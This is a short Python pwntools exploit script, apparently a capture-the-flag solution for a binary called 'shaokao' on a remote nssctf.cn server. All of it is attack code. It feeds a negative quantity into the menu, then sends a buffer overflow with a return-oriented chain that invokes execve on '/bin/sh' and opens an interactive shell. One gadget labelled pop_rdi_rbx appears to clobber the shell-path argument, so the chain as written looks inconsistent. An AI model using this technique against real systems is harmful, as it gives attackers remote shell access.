from pwn import *

# io = process("./shaokao")

io = remote("node4.anna.nssctf.cn", 29482)

pop_rax_ret_addr = 0x458827
pop_rdi_ret_addr = 0x40264F
pop_rsi_ret_addr = 0x40A67E
pop_rdi_rbx_ret_addr = 0x4A404B
syscall_addr = 0x402404
name_addr = 0x4E60F0

io.recvuntil(b">")
io.sendline(b"1")
io.sendline(b"1")
io.sendline(b"-10000000")
io.sendline(b"4")
io.sendline(b"5")

shell = b"/bin/sh\x00"
payload = (
    shell
    + b"a" * (0x20 + 0x8 - len(shell))
    + p64(pop_rax_ret_addr)
    + p64(59)
    + p64(pop_rdi_ret_addr)
    + p64(name_addr)
    + p64(pop_rsi_ret_addr)
    + p64(0)
    + p64(pop_rdi_rbx_ret_addr)
    + p64(0)
    + p64(0)
    + p64(syscall_addr)
)
io.sendline(payload)
io.interactive()
